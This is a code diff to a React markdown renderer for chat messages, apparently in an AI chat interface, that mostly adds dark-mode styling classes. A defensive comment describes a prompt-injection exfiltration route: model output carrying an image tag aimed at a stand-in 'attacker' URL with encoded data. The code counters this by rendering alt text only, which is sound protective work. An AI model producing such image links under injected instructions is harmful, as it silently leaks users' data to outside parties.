@@ -28,16 +28,16 @@ function sanitizeHref(href?: string): string | undefined {
  */
 const markdownComponents: Components = {
   h1: ({ children }) => (
-    <h3 className="mb-1 mt-2 text-sm font-semibold text-gray-900 first:mt-0">{children}</h3>
+    <h3 className="mb-1 mt-2 text-sm font-semibold text-gray-900 first:mt-0 dark:text-gray-100">{children}</h3>
   ),
   h2: ({ children }) => (
-    <h3 className="mb-1 mt-2 text-sm font-semibold text-gray-900 first:mt-0">{children}</h3>
+    <h3 className="mb-1 mt-2 text-sm font-semibold text-gray-900 first:mt-0 dark:text-gray-100">{children}</h3>
   ),
   h3: ({ children }) => (
-    <h4 className="mb-1 mt-2 text-sm font-semibold text-gray-900 first:mt-0">{children}</h4>
+    <h4 className="mb-1 mt-2 text-sm font-semibold text-gray-900 first:mt-0 dark:text-gray-100">{children}</h4>
   ),
   h4: ({ children }) => (
-    <h4 className="mb-1 mt-2 text-[13px] font-semibold text-gray-900 first:mt-0">{children}</h4>
+    <h4 className="mb-1 mt-2 text-[13px] font-semibold text-gray-900 first:mt-0 dark:text-gray-100">{children}</h4>
   ),
   p: ({ children }) => <p className="mb-2 last:mb-0">{children}</p>,
   ul: ({ children }) => (
@@ -47,7 +47,7 @@ const markdownComponents: Components = {
     <ol className="mb-2 ml-4 list-decimal space-y-0.5 last:mb-0 marker:text-gray-400">{children}</ol>
   ),
   li: ({ children }) => <li className="leading-snug">{children}</li>,
-  strong: ({ children }) => <strong className="font-semibold text-gray-900">{children}</strong>,
+  strong: ({ children }) => <strong className="font-semibold text-gray-900 dark:text-gray-100">{children}</strong>,
   em: ({ children }) => <em className="italic">{children}</em>,
   a: ({ children, href }) => {
     const safeHref = sanitizeHref(href);
@@ -68,23 +68,23 @@ const markdownComponents: Components = {
   // influenced by injected/retrieved text, and an <img src="https://attacker/..."
   // ?data=..."> is fetched by the browser with zero clicks, exfiltrating
   // anything the model encoded in the URL. Render the alt text instead.
-  img: ({ alt }) => (alt ? <span className="italic text-gray-500">[image: {alt}]</span> : null),
+  img: ({ alt }) => (alt ? <span className="italic text-gray-500 dark:text-gray-400">[image: {alt}]</span> : null),
   code: ({ children }) => (
-    <code className="rounded bg-gray-100 px-1 py-0.5 font-mono text-[12px] text-gray-800">
+    <code className="rounded bg-gray-100 px-1 py-0.5 font-mono text-[12px] text-gray-800 dark:bg-navy-700 dark:text-gray-200">
       {children}
     </code>
   ),
   pre: ({ children }) => (
-    <pre className="mb-2 overflow-x-auto rounded-lg bg-gray-100 p-2 font-mono text-[12px] text-gray-800 last:mb-0">
+    <pre className="mb-2 overflow-x-auto rounded-lg bg-gray-100 p-2 font-mono text-[12px] text-gray-800 last:mb-0 dark:bg-navy-700 dark:text-gray-200">
       {children}
     </pre>
   ),
   blockquote: ({ children }) => (
-    <blockquote className="mb-2 border-l-2 border-gray-300 pl-2.5 italic text-gray-600 last:mb-0">
+    <blockquote className="mb-2 border-l-2 border-gray-300 pl-2.5 italic text-gray-600 last:mb-0 dark:border-navy-700 dark:text-gray-400">
       {children}
     </blockquote>
   ),
-  hr: () => <hr className="my-2 border-gray-200" />,
+  hr: () => <hr className="my-2 border-gray-200 dark:border-navy-700" />,
 };
 
 interface MarkdownMessageProps {
@@ -93,7 +93,7 @@ interface MarkdownMessageProps {
 
 function MarkdownMessageBase({ content }: MarkdownMessageProps) {
   return (
-    <div className="break-words text-sm leading-relaxed text-gray-800">
+    <div className="break-words text-sm leading-relaxed text-gray-800 dark:text-gray-200">
       <ReactMarkdown remarkPlugins={[remarkGfm]} components={markdownComponents}>
         {content}
       </ReactMarkdown>
